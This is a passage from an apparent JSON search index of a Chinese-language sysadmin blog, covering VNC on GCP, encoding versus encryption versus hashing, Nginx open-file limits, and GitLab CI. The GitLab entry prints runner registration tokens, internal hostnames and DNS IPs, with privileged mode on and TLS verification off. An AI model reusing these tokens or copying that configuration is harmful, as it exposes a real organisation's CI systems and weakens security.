安裝完成後先執行vncserver，會先跳出password設定的選項\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evncserver\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"modify-vncxstartup\"\u003emodify \u003ccode\u003e~/.vnc/xstartup\u003c/code\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Uncomment the following two lines for normal desktop:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# unset SESSION_MANAGER\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# exec /etc/X11/xinit/xinitrc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -x /etc/vnc/xstartup \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e exec /etc/vnc/xstartup\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -r $HOME/.Xresources \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e xrdb $HOME/.Xresources\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003exsetroot -solid grey\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evncconfig -iconic \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ex-terminal-emulator -geometry 80x24+10+10 -ls -title \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$VNCDESKTOP\u003cspan style=\"color:#e6db74\"\u003e Desktop\u0026#34;\u003c/span\u003e \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ex-window-manager \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egnome-panel \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egnome-settings-daemon \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emetacity \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enautilus \u0026amp;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"exec\"\u003eexec\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 殺掉目前執行的vncserver 然後重新執行\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evncserver -kill :1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# vncserver預設是執行在port 5900上，如果在後面加上：1 就是5901以此類推\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evncserver :1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"設定-reboot-的時候自動執行-vncserver\"\u003e設定 reboot 的時候自動執行 vncserver\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e@reboot /usr/bin/vncserver :1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","VNC"],"title":"【筆記】在GCP上建立可Remote dekstop的Ubuntu環境"},{"categories":["URL","Encode","Encrypt","Hash"],"contents":" 一次搞懂密碼學中的三兄弟 — Encode、Encrypt 跟 Hash 編碼（Encoding） 不會修改資料、也沒有任何加密的效果，單純就是 換個方式來表達資料 而已，其中最有名的例子就是摩斯密碼\nJavaScript 中有兩個很實用的 function 分別是 encodeURI 跟 decodeURI 把網址中的特殊字元（空白、標點符號等等）編碼成符合 URL 的格式 Base64 是一種可以把二進位的資料編碼成 ASCII 字元的方法 霍夫曼編碼（Huffman Coding） 一種用來進行 無失真壓縮 的編碼演算法，說穿了他的概念就是把常用的字記成縮寫，從而降低資料量、達到壓縮的效果 加密（Encrypt） 加密跟解密必須要有金鑰（Key）才能進行。以最簡單的 凱薩加密法 來說，他加密的方式就是把每個英文字母加上一個 偏移量，這個偏移量就是用來執行加解密的 Key\nAES (Advanced Encryption Standard) 是一種對稱加密演算法，所謂的對稱就是說加密解密 都是用同一個 key，這點跟上面說到的凱薩加密法一樣，但 AES 不像凱薩的 key 只有 0-25 這麼少種，而是可以有超過 10³⁸ 種 RSA 這類非對稱加密法有個很特別的地方，就是他會產生一組兩個 Key 分別叫公鑰（Public Key）跟私鑰（Private Key），而且 用公鑰加密的內容只能用私鑰解 雜湊（Hashing） 各個 欄位/字元 丟進去某個公式計算的方式就叫做雜湊（Hash），而這個計算公式就稱為 雜湊函數（Hash function），過程可能會做各種加減乘除，最後算出一個值或字串，因為不可能由雜湊後的結果回推，所以雜湊的過程是 不可逆的\n","date":"October 18, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211018-what-are-encoding-encrypt-and-hashing/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/starbugs/what-are-encoding-encrypt-and-hashing-4b03d40e7b0c\" target=\"_blank\" rel=\"noopener\"\u003e一次搞懂密碼學中的三兄弟 — Encode、Encrypt 跟 Hash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"編碼encoding\"\u003e編碼（Encoding）\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e不會修改資料、也沒有任何加密的效果，單純就是 換個方式來表達資料 而已，其中最有名的例子就是\u003ccode\u003e摩斯密碼\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eJavaScript 中有兩個很實用的 function 分別是 \u003ccode\u003eencodeURI\u003c/code\u003e 跟 \u003ccode\u003edecodeURI\u003c/code\u003e 把網址中的特殊字元（空白、標點符號等等）編碼成符合 URL 的格式\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eBase64\u003c/code\u003e 是一種可以把二進位的資料編碼成 ASCII 字元的方法\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e霍夫曼編碼（Huffman Coding）\u003c/code\u003e 一種用來進行 無失真壓縮 的編碼演算法，說穿了他的概念就是把常用的字記成縮寫，從而降低資料量、達到壓縮的效果\u003c/li\u003e\n\u003c/ul\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"加密encrypt\"\u003e加密（Encrypt）\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e加密跟解密必須要有金鑰（Key）才能進行。以最簡單的 凱薩加密法 來說，他加密的方式就是把每個英文字母加上一個 偏移量，這個偏移量就是用來執行加解密的 Key\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAES (Advanced Encryption Standard) 是一種對稱加密演算法，所謂的對稱就是說加密解密 都是用同一個 key，這點跟上面說到的凱薩加密法一樣，但 AES 不像凱薩的 key 只有 0-25 這麼少種，而是可以有超過 10³⁸ 種\u003c/li\u003e\n\u003cli\u003eRSA 這類非對稱加密法有個很特別的地方，就是他會產生一組兩個 Key 分別叫公鑰（Public Key）跟私鑰（Private Key），而且 用公鑰加密的內容只能用私鑰解\u003c/li\u003e\n\u003c/ul\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"雜湊hashing\"\u003e雜湊（Hashing）\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e各個 欄位/字元 丟進去某個公式計算的方式就叫做雜湊（Hash），而這個計算公式就稱為 雜湊函數（Hash function），過程可能會做各種加減乘除，最後算出一個值或字串，因為不可能由雜湊後的結果回推，所以雜湊的過程是 不可逆的\u003c/p\u003e\u003c/blockquote\u003e","tags":["URL","Encode","Encrypt","Hash"],"title":"一次搞懂密碼學中的三兄弟 — Encode、Encrypt 跟 Hash"},{"categories":["URL","Nginx"],"contents":" Nginx 出現 500 Error 修復 (too many open file, connection) Nginx 出現 500 Error, 錯誤訊息只能從 Log 查到, 有遇到下述兩種狀況:\nsocket() failed (24: Too many open files) while connecting to upstream $ sudo su - www-data $ ulimit -n # 看目前系統設定的限制 (ulimit -a # 可查看全部參數) 1024 # vim /etc/security/limits.conf # 由此檔案設定 nofile (nofile - max number of open files) 的大小 # 增加/修改 下述兩行 * soft nofile 655360 * hard nofile 655360 ulimit -n # 登出後, 在登入, 執行就會出現此值 655360 # 若 ulimit -n 沒出現 655360 的話, 可使用 ulimit -n 655360 # 強制設定 # 再用 ulimit -n 或 ulimit -Sn (驗證軟式設定)、ulimit -Hn (驗證硬式設定) 檢查看看(或 ulimit -a). # 從系統面另外計算 + 設定 lsof | wc -l # 計算開啟檔案數量 sudo vim /etc/sysctl.conf fs.file-max = 3268890 sudo sysctl -p 512 worker_connections are not enough while connecting to upstream # /etc/nginx/nginx.conf worker_connections 10240; # 參考 Nginx CoreModule # worker_processes 2; # worker_rlimit_nofile 10240; # events { # # worker_connections 10240; # } # Nginx 的 connection 增加後, 整體速度會變慢很多, 主要原因是 php-cgi 不夠用, 所以要作以下調整. # php-cgi was started with phpfcgid_children=\u0026#34;10\u0026#34; and phpfcgid_requests=\u0026#34;500\u0026#34; # ab was run on another server, connect via a switch using GBit ethernet # http://till.klampaeckel.de/blog/archives/30-PHP-performance-III-Running-nginx.html # vim /etc/nginx/nginx.conf worker_connections 10240; worker_rlimit_nofile # vim /etc/init.d/php-fcgi PHP_FCGI_CHILDREN=15 PHP_FCGI_MAX_REQUESTS=1000 改成 PHP_FCGI_CHILDREN=512 # 或 150 慢慢加, 注意 MySQL connection 是否夠用 PHP_FCGI_MAX_REQUESTS=10240 # 上述文章的 phpfcgid_stop(), 寫得還不錯, 有需要可以用看看. # phpfcgid_stop() { # echo \u0026#34;Stopping $name.\u0026#34; # pids=`pgrep php-cgi` # pkill php-cgi # wait_for_pids $pids # } ","date":"October 9, 2021","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211009-nginx-worker-many-file-fix/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.longwin.com.tw/2011/05/nginx-worker-many-file-fix-2011/\" target=\"_blank\" rel=\"noopener\"\u003eNginx 出現 500 Error 修復 (too many open file, connection)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eNginx 出現 500 Error, 錯誤訊息只能從 Log 查到, 有遇到下述兩種狀況:\u003c/p\u003e\n\u003ch3 id=\"socket-failed-24-too-many-open-files-while-connecting-to-upstream\"\u003esocket() failed (24: Too many open files) while connecting to upstream\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo su - www-data\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ulimit -n \u003cspan style=\"color:#75715e\"\u003e# 看目前系統設定的限制 (ulimit -a # 可查看全部參數)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# vim /etc/security/limits.conf # 由此檔案設定 nofile (nofile - max number of open files) 的大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 增加/修改 下述兩行\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e* soft nofile \u003cspan style=\"color:#ae81ff\"\u003e655360\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e* hard nofile \u003cspan style=\"color:#ae81ff\"\u003e655360\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eulimit -n \u003cspan style=\"color:#75715e\"\u003e# 登出後, 在登入, 執行就會出現此值\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e655360\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 若 ulimit -n 沒出現 655360 的話, 可使用 ulimit -n 655360 # 強制設定\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 再用 ulimit -n 或 ulimit -Sn (驗證軟式設定)、ulimit -Hn (驗證硬式設定) 檢查看看(或 ulimit -a).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 從系統面另外計算 + 設定\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elsof | wc -l \u003cspan style=\"color:#75715e\"\u003e# 計算開啟檔案數量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo vim /etc/sysctl.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efs.file-max \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3268890\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo sysctl -p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"512-worker_connections-are-not-enough-while-connecting-to-upstream\"\u003e512 worker_connections are not enough while connecting to upstream\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /etc/nginx/nginx.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eworker_connections  10240;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 參考 Nginx CoreModule\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# worker_processes 2;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# worker_rlimit_nofile 10240;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# events {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# # worker_connections 10240;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Nginx 的 connection 增加後, 整體速度會變慢很多, 主要原因是 php-cgi 不夠用, 所以要作以下調整.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# php-cgi was started with phpfcgid_children=\u0026#34;10\u0026#34; and phpfcgid_requests=\u0026#34;500\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# ab was run on another server, connect via a switch using GBit ethernet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# http://till.klampaeckel.de/blog/archives/30-PHP-performance-III-Running-nginx.html\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# vim /etc/nginx/nginx.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eworker_connections 10240;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eworker_rlimit_nofile\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# vim /etc/init.d/php-fcgi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePHP_FCGI_CHILDREN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePHP_FCGI_MAX_REQUESTS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e改成\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePHP_FCGI_CHILDREN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 或 150 慢慢加, 注意 MySQL connection 是否夠用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePHP_FCGI_MAX_REQUESTS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e10240\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 上述文章的 phpfcgid_stop(), 寫得還不錯, 有需要可以用看看.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# phpfcgid_stop() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# echo \u0026#34;Stopping $name.\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# pids=`pgrep php-cgi`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# pkill php-cgi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# wait_for_pids $pids\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Nginx"],"title":"Nginx 出現 500 Error 修復 (too many open file, connection)"},{"categories":["URL","Terminal","Zsh","Zim"],"contents":" 超簡單！快速打造漂亮又好用的 zsh 終端環境 用 zsh + zim + powerlevel10k 讓你的 Terminal 潮又快 打造 10X Engineer Shell 工作環境 ","date":"October 7, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211009-zsh/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/@white1033/%E8%B6%85%E7%B0%A1%E5%96%AE-%E5%BF%AB%E9%80%9F%E6%89%93%E9%80%A0%E6%BC%82%E4%BA%AE%E5%8F%88%E5%A5%BD%E7%94%A8%E7%9A%84-zsh-%E7%B5%82%E7%AB%AF%E7%92%B0%E5%A2%83-c81874368264\" target=\"_blank\" rel=\"noopener\"\u003e超簡單！快速打造漂亮又好用的 zsh 終端環境\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://dwye.dev/post/zsh-zim-powerlevel10k/\" target=\"_blank\" rel=\"noopener\"\u003e用 zsh + zim + powerlevel10k 讓你的 Terminal 潮又快\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/starbugs/%E6%89%93%E9%80%A0-10x-engineer-zsh-shell-97e40db76391\" target=\"_blank\" rel=\"noopener\"\u003e打造 10X Engineer Shell 工作環境\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Terminal","Zsh","Zim"],"title":"超簡單！快速打造漂亮又好用的 zsh 終端環境"},{"categories":["URL","Git","GPG"],"contents":" 利用 GPG 簽署 git commit ","date":"October 5, 2021","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211005-sign_git_commit_with_gpg/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.puckwang.com/posts/2019/sign_git_commit_with_gpg/\" target=\"_blank\" rel=\"noopener\"\u003e利用 GPG 簽署 git commit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Git","GPG"],"title":"利用 GPG 簽署 git commit"},{"categories":["Gitlab","CI"],"contents":"Gitlab CI Concept Gitlab DevOps GitOps Workflow code push -\u0026gt; pipeline -\u0026gt; stage -\u0026gt; job Design plan -\u0026gt; code -\u0026gt; build -\u0026gt; test -\u0026gt; release -\u0026gt; deploy -\u0026gt; operate -\u0026gt; monitor -\u0026gt; plan Runner Executors Shell VirtualBox Docker Docker Machine Kubernetes Else\u0026hellip; References Gitlab CI/CD Gitlab Runner .gitlab-ci.yaml Runner Register gitlab-runner register\nAfter register concurrent = 1 check_interval = 0 [session_server] session_timeout = 1800 [[runners]] name = \u0026#34;public-shell\u0026#34; url = \u0026#34;https://gitlab.go2cloudten.com/\u0026#34; token = \u0026#34;-mdH9OAOzG5yPsf_AVnW\u0026#34; executor = \u0026#34;shell\u0026#34; [[runners]] name = \u0026#34;public-docker\u0026#34; url = \u0026#34;https://gitlab.go2cloudten.com/\u0026#34; token = \u0026#34;AcEGPPKTS1uuQ_A_qpWy\u0026#34; executor = \u0026#34;docker\u0026#34; [runners.docker] dns = [\u0026#34;192.168.185.5\u0026#34;, \u0026#34;192.168.185.6\u0026#34;] tls_verify = false image = \u0026#34;registry.go2cloudten.com/it/office_sop/node:12.13.0\u0026#34; privileged = true disable_entrypoint_overwrite = false oom_kill_disable = false disable_cache = false shm_size = 0 pull_policy = \u0026#34;if-not-present\u0026#34; volumes = [\u0026#34;/cache\u0026#34;] Repository .gitlab-ci.yaml stages: - domain check-icp: stage: domain image: registry.go2cloudten.com/it/office_sop/icp tags: - docker script: - domains=$(awk -F \u0026#39;|\u0026#39; \u0026#39;{if($6 ~ \u0026#34;Y\u0026#34; \u0026amp;\u0026amp; ($7 ~ \u0026#34;West\u0026#34; || $7 ~ \u0026#34;Yuqu\u0026#34;)) print $3}\u0026#39; domains-info.md | sed \u0026#39;s/ //g\u0026#39; | sort | uniq) - if [[ \u0026#34;${domains}\u0026#34; == \u0026#34;\u0026#34; ]]; then telegram.sh \u0026#39;There is no domain in list\u0026#39; ; else telegram.sh \u0026#39;Start checking ICP.\u0026#39; ; fi - for i in ${domains}; do result=$(checkicp ${i}); if [[ \u0026#34;${result}\u0026#34; == \u0026#34;未备案\u0026#34; ]];then telegram.sh \u0026#34;${i} 未备案\u0026#34;; sleep 1 ;fi;done - telegram.sh \u0026#39;ICP check completed.\u0026#39; only: - schedules ","date":"September 24, 2021","hero":"/images/hero/gitlab.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210924-gitlab/","summary":"\u003ch1 id=\"gitlab-ci\"\u003eGitlab CI\u003c/h1\u003e\n\u003ch2 id=\"concept\"\u003eConcept\u003c/h2\u003e\n\u003ch3 id=\"gitlab\"\u003eGitlab\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eDevOps\u003c/li\u003e\n\u003cli\u003eGitOps\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"workflow\"\u003eWorkflow\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecode push -\u0026gt; pipeline -\u0026gt; stage -\u0026gt; job\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"design\"\u003eDesign\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eplan -\u0026gt; code -\u0026gt; build -\u0026gt; test -\u0026gt; release -\u0026gt; deploy -\u0026gt; operate -\u0026gt; monitor -\u0026gt; plan\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"runner-executors\"\u003eRunner Executors\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eShell\u003c/li\u003e\n\u003cli\u003eVirtualBox\u003c/li\u003e\n\u003cli\u003eDocker\u003c/li\u003e\n\u003cli\u003eDocker 